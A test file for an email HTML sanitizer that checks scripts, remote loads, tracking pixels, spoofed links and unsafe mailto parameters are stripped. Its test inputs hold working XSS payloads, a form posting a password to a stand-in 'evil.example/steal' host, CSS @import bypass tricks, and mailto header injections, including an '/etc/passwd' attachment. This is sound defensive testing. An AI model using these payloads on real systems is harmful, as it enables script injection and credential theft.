import { test } from "node:test";
import assert from "node:assert/strict";
import { cleanCss, cleanMailHtml, MAIL_CSP, mailDocument, mailHref, PICTURE_CHARS_MAX, pictureData, pictureType, QUOTE_SELECTOR, withImages } from "../src/mail-html.js";
import { cidParts } from "../src/imports/icloud.js";
import { ownWords, quoteStart } from "../src/imports/mail-text.js";
import { previewOf } from "../src/mail-inbox.js";

const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13]);

test("mail html: nothing that runs, loads or submits survives", () => {
  const evil = `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/">
    <link rel="stylesheet" href="https://evil.example/x.css"><script>alert(1)</script></head>
    <body onload="alert(2)" bgcolor="#eee">
    <p onclick="alert(3)" style="color:red">Hello <b>there</b></p>
    <a href="javascript:alert(4)">bad</a> <a href="data:text/html,<script>alert(5)</script>">bad2</a>
    <a href="https://shop.example/a?x=1&amp;y=2" target="_top">good</a> <a href="mailto:help@shop.example">mail</a>
    <iframe src="https://evil.example/"></iframe><object data="x.swf"></object><embed src="x">
    <form action="https://evil.example/steal"><input name="password"><button>Go</button></form>
    <svg><script>alert(6)</script><a href="javascript:alert(7)">s</a></svg>
    <img src="x" onerror="alert(8)"><img src="javascript:alert(9)">
    <noscript><img src="https://evil.example/ns.gif"></noscript>
    <style>@import url(https://evil.example/i.css); .a { background: url(https://evil.example/bg.png) } .b { width: expression(alert(10)) }</style>
    <div style="background-image:url('https://evil.example/t.gif');behavior:url(x.htc)">x</div>
    <p>&lt;script&gt;alert(11)&lt;/script&gt;</p>
    </body></html>`;
  const { html, remote } = cleanMailHtml(evil);
  for (const bad of [/<script/i, /\son\w+=/i, /javascript:/i, /data:text/i, /<iframe/i, /<object/i, /<embed/i, /<form/i, /<input/i, /<button/i, /<svg/i, /<meta/i, /<base/i, /<link/i, /@import/i, /evil\.example/, /expression\(/i, /behavior/i, /target=/i]) {
    assert.doesNotMatch(html, bad, String(bad));
  }
  assert.match(html, /<p style="color:red">Hello <b>there<\/b><\/p>/);
  assert.match(html, /<a href="https:\/\/shop\.example\/a\?x=1&amp;y=2">good<\/a>/);
  assert.match(html, /<a href="mailto:help@shop\.example">mail<\/a>/);
  assert.match(html, /class="aeneas-mail" bgcolor="#eee"/, "the body's colour is kept on the wrapper");
  assert.match(html, /&lt;script&gt;alert\(11\)/, "text that looks like markup stays text");
  assert.deepEqual(remote, [], "an <img src=x> and a javascript: picture are not fetched");
});

test("mail html: CSS loads nothing but pictures written into the mail", () => {
  assert.equal(cleanCss("a{background:url(https://t.example/p.gif)}"), "a{background:none}");
  assert.doesNotMatch(cleanCss("a{background:u\\72l(https://t.example/p.gif)}"), /url\(/, "a CSS escape cannot spell url");
  assert.equal(cleanCss(`a{background:image-set("https://t.example/p.gif" 1x)}`), `a{background:none("https://t.example/p.gif" 1x)}`);
  assert.equal(cleanCss("a{background:url( 'data:image/png;base64,iVBORw0KGgoAAAAN' )}"), 'a{background:url("data:image/png;base64,iVBORw0KGgoAAAAN")}');
  assert.equal(cleanCss("a{background:url(data:image/png;base64,PHN2Zz48L3N2Zz4=)}"), "a{background:none}", "bytes that are not the picture their label says");
  assert.equal(cleanCss("a{background:url(data:image/svg+xml;base64,AAAA)}"), "a{background:none}", "never an SVG");
  assert.equal(cleanCss("@font-face{font-family:x;src:url(https://f.example/x.woff)} p{color:red}"), " p{color:red}");
  assert.doesNotMatch(cleanCss("</style><script>alert(1)</script>"), /[<>]/);
});

test("mail html: pictures inside the mail are written in; web pictures are numbered for the hub to fetch, never loaded", () => {
  const data = pictureData(PNG)!;
  const { html, remote } = cleanMailHtml(`<img src="cid:logo@x" alt="Logo" width="120"><img src="https://img.example/a.png"><img src="//img.example/b.png" srcset="https://img.example/c.png 2x"><img src="https://img.example/a.png"><img src="cid:missing@x">`, new Map([["logo@x", data]]));
  assert.deepEqual(remote, ["https://img.example/a.png", "https://img.example/b.png"], "each address once; srcset never");
  assert.ok(html.includes(`<img src="${data}" width="120" alt="Logo">`));
  assert.doesNotMatch(html, /img\.example/, "no web address is in the page");
  assert.equal((html.match(/<img data-r="0"/g) ?? []).length, 2);
  const shown = withImages(html, [pictureData(PNG), null]);
  assert.doesNotMatch(shown, /data-r=/);
  assert.equal((shown.match(/data:image\/png/g) ?? []).length, 3);
  assert.equal(withImages(html, ["data:text/html;base64,PHNjcmlwdD4="]).includes("data:text/html"), false, "only a picture is written in");
});

test("mail html: a tracking pixel is never handed to the hub to fetch; a picture hidden for phones still is", () => {
  const pixels = [
    `<img src="https://t.example/open?u=1" width="1" height="1" border="0" alt="">`,
    `<img src="https://t.example/open?u=2" width="0" height="0">`,
    `<img src="https://t.example/open?u=3" style="height:1px !important; width:1px !important; border-width:0 !important">`,
    `<img src="https://t.example/open?u=4" width="1" style="HEIGHT: 1PX">`,
    `<img src="https://t.example/open?u=5" style="display: none">`,
    `<img src="https://t.example/open?u=6" style="visibility:hidden" width="600">`,
    `<img src="https://t.example/open?u=7" hidden>`,
  ];
  for (const p of pixels) {
    const { html, remote } = cleanMailHtml(`<p>Hello</p>${p}`);
    assert.deepEqual(remote, [], p);
    assert.doesNotMatch(html, /data-r=|t\.example/, p);
  }
  const shown = [
    // 1 wide but tall, or one side unknown: a rule or a spacer, not a pixel.
    `<img src="https://img.example/rule.png" width="600" height="1">`,
    `<img src="https://img.example/a.png" width="1">`,
    `<img src="https://img.example/b.png" width="100%" height="1">`,
    // Its attributes say 1 by 1 but its style makes it large: it is seen.
    `<img src="https://img.example/c.png" width="1" height="1" style="width:600px;height:200px">`,
    // Hidden with a class or id: a style rule for narrow screens can show it (a second picture for phones).
    `<img src="https://img.example/phone.png" class="mobile" style="display:none">`,
    `<img src="https://img.example/phone2.png" id="hero-m" style="display:none;max-height:0">`,
  ];
  for (const p of shown) assert.equal(cleanMailHtml(p).remote.length, 1, p);
  // A 1 by 1 picture sent inside the mail contacts nobody, so it stays.
  const inside = cleanMailHtml(`<img src="cid:dot@x" width="1" height="1">`, new Map([["dot@x", pictureData(PNG)!]]));
  assert.match(inside.html, /<img src="data:image\/png;base64,/);
});

test("mail html: web pictures are asked for over https only", () => {
  const { remote } = cleanMailHtml(`<img src="http://img.example/a.png"><img src="HTTP://img.example:80/b.png"><img src="http://img.example:8080/c.png"><img src="//img.example/d.png"><img src="ftp://img.example/e.png"><img src="https://user:pw@img.example/f.png">`);
  assert.deepEqual(remote, ["https://img.example/a.png", "https://img.example/b.png", "https://img.example:8080/c.png", "https://img.example/d.png"]);
});

test("mail html: nothing inside a link can give it a tooltip other than its address", () => {
  const { html } = cleanMailHtml(`<p><a href="https://evil.example/login" title="https://bank.example/"><span title="https://bank.example/signin">Review your account</span></a></p><abbr title="x">y</abbr>`);
  assert.doesNotMatch(html, /title=/, "the screen sets each link's title to where it goes; the mail sets none");
  assert.match(html, /<a href="https:\/\/evil\.example\/login"><span>Review your account<\/span><\/a>/);
});

test("mail html: an @import cannot be put back together from what the cleaning takes out", () => {
  const sheets = [
    '@im@import;port "https://t.example/a.css";',
    '@imp@font-face{}ort "https://t.example/a.css";',
    '@im\\port "https://t.example/a.css";',
    '@im@im@import;port;port "https://t.example/a.css";',
    '@IMP@FONT-FACE {x}ORT url(https://t.example/a.css);',
    '@im@font-face{@import;}port "https://t.example/a.css";',
  ];
  for (const css of sheets) {
    assert.doesNotMatch(cleanCss(css), /@import/i, css);
    assert.doesNotMatch(cleanMailHtml(`<style>${css}</style><p style='${css}'>x</p>`).html, /@import/i, css);
  }
});

test("mail html: a mailto link keeps its address, subject and body, and nothing else", () => {
  assert.equal(mailHref("mailto:help@shop.example"), "mailto:help@shop.example");
  assert.equal(mailHref("MAILTO:a@b.example,c@d.example"), "mailto:a@b.example,c@d.example");
  assert.equal(mailHref("mailto:unsubscribe@list.example?subject=Unsubscribe%20me&body=Line%0Atwo&bcc=evil@x.example&cc=y@x.example&attach=/etc/passwd"), "mailto:unsubscribe@list.example?subject=Unsubscribe%20me&body=Line%0Atwo");
  assert.equal(mailHref("mailto:a@b.example?body=one&body=two&Subject=S"), "mailto:a@b.example?subject=S&body=one", "the first of each");
  // Not an address, a second scheme, a right-to-left mark dressing one address as another, a display name.
  for (const bad of ["mailto://javascript:alert(1)", "mailto:javascript:alert(1)", "mailto:a@b.example%E2%80%AEmoc.knab", "mailto:Bank%20%3Ca@evil.example%3E", "mailto:", "mailto:a@b.example%0D%0ABcc:x@y.example", "mailto:a@b.example?subject=%E0%A4%A"]) {
    const kept = mailHref(bad);
    assert.ok(kept === null || kept === "mailto:a@b.example", `${bad} gave ${kept}`);
  }
  assert.equal(mailHref("mailto:a@b.example%E2%80%AEmoc.knab"), null);
  // At most 500 characters: the body goes first.
  const long = mailHref(`mailto:a@b.example?subject=Hi&body=${"x".repeat(900)}`)!;
  assert.equal(long, "mailto:a@b.example?subject=Hi");
  const { html } = cleanMailHtml(`<a href="mailto:a@b.example?bcc=evil@x.example">write</a>`);
  assert.match(html, /<a href="mailto:a@b\.example">write<\/a>/);
});

test("mail html: the pictures a mail holds have a limit in all, however often one is shown", () => {
  // One 2 MB picture sent inside the mail, shown 250 times (it was written 250 times: 667 MB, past what a string holds).
  const big = `data:image/png;base64,iVBORw0KGgoAAAAN${"A".repeat(2_666_000)}`;
  const inside = cleanMailHtml(`<p>Hello</p>${'<img src="cid:p">'.repeat(250)}`, new Map([["p", big]]));
  assert.equal(inside.html.split('src="data:').length - 1, Math.floor(PICTURE_CHARS_MAX / big.length), "as many as fit, the rest empty");
  assert.ok(inside.pictures <= PICTURE_CHARS_MAX);
  assert.ok(inside.html.length - inside.pictures < 20_000, "what is left is the mail's markup");
  // The same picture on the web, shown 2,000 times.
  const web = cleanMailHtml(`<p>Hello</p>${'<img src="https://img.example/p.png">'.repeat(2000)}`);
  assert.deepEqual(web.remote, ["https://img.example/p.png"]);
  const t0 = Date.now();
  const shown = withImages(web.html, [big]);
  assert.ok(Date.now() - t0 < 3000, "checked once, not once per tag");
  assert.equal(shown.split('src="data:').length - 1, Math.floor(PICTURE_CHARS_MAX / big.length));
  assert.doesNotMatch(shown, /data-r=/);
  // What the mail holds already counts: with pictures sent inside it, fewer from the web fit.
  const both = cleanMailHtml(`${'<img src="cid:p">'.repeat(3)}${'<img src="https://img.example/p.png">'.repeat(5)}`, new Map([["p", big]]));
  assert.equal(withImages(both.html, [big]).split('src="data:').length - 1, Math.floor(PICTURE_CHARS_MAX / big.length));
  // A data: picture in the HTML whose bytes are not what it is called is left out.
  assert.doesNotMatch(cleanMailHtml(`<img src="data:image/png;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`).html, /src=/);
  assert.match(cleanMailHtml(`<img src="data:image/png;base64,iVBORw0KGgoAAAAN">`).html, /<img src="data:image\/png;base64,iVBORw0KGgoAAAAN">/);
});

test("mail html: a picture is told by its bytes, never by what its server calls it, and never SVG", () => {
  assert.equal(pictureType(PNG), "image/png");
  assert.equal(pictureType(Buffer.from([0xff, 0xd8, 0xff, 0xe0])), "image/jpeg");
  assert.equal(pictureType(Buffer.from("GIF89a....")), "image/gif");
  assert.equal(pictureType(Buffer.from("<svg onload=alert(1)>")), null);
  assert.equal(pictureType(Buffer.from("<html>")), null);
  assert.equal(pictureData(Buffer.from("<html>")), null);
});

test("mail html: the page's own policy loads nothing from anywhere; links are http(s) or mailto only", () => {
  const page = mailDocument("<p>Hi</p>");
  assert.ok(page.includes(`content="${MAIL_CSP}"`));
  assert.match(MAIL_CSP, /default-src 'none'/);
  assert.match(MAIL_CSP, /img-src data:;/);
  assert.match(MAIL_CSP, /script-src 'none'/);
  assert.equal(mailHref("javascript:alert(1)"), null);
  assert.equal(mailHref("file:///c:/x"), null);
  assert.equal(mailHref("https://user:pw@bank.example/"), null);
  assert.equal(mailHref("https://shop.example/x"), "https://shop.example/x");
});

test("mail html: only pictures the HTML shows are fetched from the message, never attachments", () => {
  const tree = { type: "multipart/related", childNodes: [
    { part: "1", type: "text/html" },
    { part: "2", type: "image/png", id: "<logo@x>", size: 1000 },
    { part: "3", type: "image/png", id: "<unused@x>", size: 1000 },
    { part: "4", type: "application/pdf", id: "<doc@x>", size: 1000 },
    { part: "5", type: "image/jpeg", id: "<huge@x>", size: 50_000_000 },
  ] };
  assert.deepEqual(cidParts(tree, `<img src="cid:logo@x"><img src="cid:doc@x"><img src="cid:huge@x">`), [{ part: "2", cid: "logo@x" }]);
});

test("mail html: the list's first line is the message's own words, never the quoted history under them", () => {
  const reply = "Great, I'll call you Monday at 3pm ET. Looking forward to it. --Sam\n\nOn Fri, Nov 13, 2026 at 2:03 PM Robin Lee <robin@example.com> wrote:\n\nHi Sam,\n\nI'd be glad to talk.";
  assert.equal(previewOf(reply), "Great, I'll call you Monday at 3pm ET. Looking forward to it. --Sam");
  assert.equal(ownWords("Sounds good.\nOn Fri, Nov 13, 2026 at 2:03 PM Robin Lee\n<robin@example.com> wrote:\n> Hi"), "Sounds good.", "the intro split over two lines");
  assert.equal(ownWords("Yes.\n\n> Can you come?\n> Robin"), "Yes.");
  assert.equal(ownWords("Approved.\n\n-----Original Message-----\nFrom: Robin"), "Approved.");
  assert.equal(ownWords("See below.\n\nFrom: Robin Lee <robin@example.com>\nSent: Friday, November 13, 2026 2:03 PM\nTo: Sam"), "See below.");
  assert.equal(ownWords("Merci !\n\nLe ven. 13 nov. 2026 à 14:03, Robin <robin@example.com> a écrit :\n> Bonjour"), "Merci !");
  assert.equal(ownWords("Danke!\n\nAm Fr., 13. Nov. 2026 um 14:03 Uhr schrieb Robin <robin@example.com>:\n> Hallo"), "Danke!");
  // Not quotes: a sentence that starts with "On" or mentions writing, and a mail that is all quote.
  assert.equal(ownWords("On Monday we fly out.\nI wrote: the list is attached."), "On Monday we fly out.\nI wrote: the list is attached.");
  assert.equal(ownWords("> only a quote"), "> only a quote");
  const t = "Yes.\n\nOn Fri, Nov 13, 2026 at 2:03 PM Robin <robin@example.com> wrote:\n> Can you?";
  assert.equal(t.slice(quoteStart(t)), "On Fri, Nov 13, 2026 at 2:03 PM Robin <robin@example.com> wrote:\n> Can you?");
  assert.equal(quoteStart("No quote here."), -1);
  assert.equal(quoteStart("> only a quote"), -1);
});

test("mail html: the page folds a reply's quoted history, as mail apps mark it, until the screen unfolds it", () => {
  const { html } = cleanMailHtml('<div>Sounds good.</div><div class="gmail_quote"><div>On Fri, Robin wrote:</div><blockquote>Can you?</blockquote></div><blockquote type="cite">Apple quote</blockquote><div id="divRplyFwdMsg">From: Robin</div><div>Outlook quote</div>');
  assert.match(html, /class="gmail_quote"/);
  assert.match(html, /<blockquote type="cite">/);
  assert.match(html, /id="divRplyFwdMsg"/);
  const page = mailDocument(html);
  assert.match(page, /<body class="aeneas-fold">/);
  assert.match(page, /body\.aeneas-fold \.gmail_quote,body\.aeneas-fold blockquote\[type="cite"\],/);
  assert.match(page, /body\.aeneas-fold #divRplyFwdMsg ~ \*\{display:none!important\}/);
  assert.equal(QUOTE_SELECTOR.split(", ").length, 6);
});

test("mail html: the list's first line shows link words, never addresses", () => {
  assert.equal(previewOf("[Coffee](https://www.drinktrade.example/all)\t[Trade](https://account.drinktrade.example?view=my_trade) Meet your next match"), "Coffee Trade Meet your next match");
  assert.equal(previewOf("Track it here (https://ship.example/t/1). Thanks"), "Track it here. Thanks");
  assert.equal(previewOf("Visit https://a.example/x or <https://b.example/y> now"), "Visit or now");
});
